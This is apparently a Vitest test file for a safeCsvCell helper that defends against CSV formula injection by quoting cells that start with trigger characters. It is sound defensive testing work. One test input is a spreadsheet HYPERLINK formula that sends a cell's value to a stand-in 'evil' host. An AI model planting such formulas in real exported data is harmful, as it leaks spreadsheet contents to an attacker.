import { describe, it, expect } from 'vitest';
import { safeCsvCell } from './safe-csv-cell';

describe('safeCsvCell', () => {
  describe('neutralizes formula triggers', () => {
    it('prefixes leading = with a single quote', () => {
      expect(safeCsvCell('=HYPERLINK("http://evil/?p="&A1,"click")')).toBe(
        '\'=HYPERLINK("http://evil/?p="&A1,"click")'
      );
    });

    it('prefixes leading + with a single quote', () => {
      expect(safeCsvCell('+1234')).toBe("'+1234");
    });

    it('prefixes leading - with a single quote', () => {
      expect(safeCsvCell('-42')).toBe("'-42");
    });

    it('prefixes leading @ with a single quote', () => {
      expect(safeCsvCell('@user')).toBe("'@user");
    });

    it('prefixes leading tab with a single quote', () => {
      expect(safeCsvCell('\tinjected')).toBe("'\tinjected");
    });

    it('prefixes leading carriage return with a single quote', () => {
      expect(safeCsvCell('\rinjected')).toBe("'\rinjected");
    });

    it('prefixes negative numbers cast from numeric values', () => {
      expect(safeCsvCell(-42)).toBe("'-42");
    });

    it('prefixes UK phone numbers starting with + (accepted false-positive)', () => {
      expect(safeCsvCell('+44 7700 900000')).toBe("'+44 7700 900000");
    });
  });

  describe('passes safe values through unchanged', () => {
    it('returns ordinary strings unchanged', () => {
      expect(safeCsvCell('hello')).toBe('hello');
    });

    it("does not quote commas — that is the serializer's job", () => {
      expect(safeCsvCell('smith, john')).toBe('smith, john');
    });

    it('returns positive numbers as their string form', () => {
      expect(safeCsvCell(42)).toBe('42');
    });

    it('returns booleans as their string form', () => {
      expect(safeCsvCell(true)).toBe('true');
      expect(safeCsvCell(false)).toBe('false');
    });

    it('JSON-stringifies objects (which start with { or [ — no trigger)', () => {
      expect(safeCsvCell({ a: 1 })).toBe('{"a":1}');
      expect(safeCsvCell([1, 2, 3])).toBe('[1,2,3]');
    });
  });

  describe('handles empty / nullish input', () => {
    it('returns empty string for null', () => {
      expect(safeCsvCell(null)).toBe('');
    });

    it('returns empty string for undefined', () => {
      expect(safeCsvCell(undefined)).toBe('');
    });

    it('returns empty string for empty string', () => {
      expect(safeCsvCell('')).toBe('');
    });
  });
});
